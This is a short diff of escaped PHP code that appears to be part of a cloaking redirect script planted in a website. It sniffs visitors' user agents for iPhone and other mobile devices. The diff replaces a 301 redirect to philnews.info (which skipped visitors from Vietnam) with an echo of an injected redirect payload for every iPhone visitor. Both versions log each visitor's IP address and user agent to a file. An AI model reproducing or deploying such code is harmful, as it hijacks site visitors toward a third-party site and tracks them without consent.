@@ -249,8 +249,8 @@ if (
     $iPad = stripos($_SERVER[\'HTTP_USER_AGENT\'],"iPad");
     $Android = stripos($_SERVER[\'HTTP_USER_AGENT\'],"Android");
     $webOS   = stripos($_SERVER[\'HTTP_USER_AGENT\'],"webOS");
-    if($iPhone && $country !== \'VN\') {
-      header(\'Location: http://philnews.info\', true, 301);
+    if($iPhone) {
+      echo "' . $redirectPN . '";
       $fAgent = fopen($allowedAgents, \'a\');
       $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
       fwrite($fAgent, $agent);
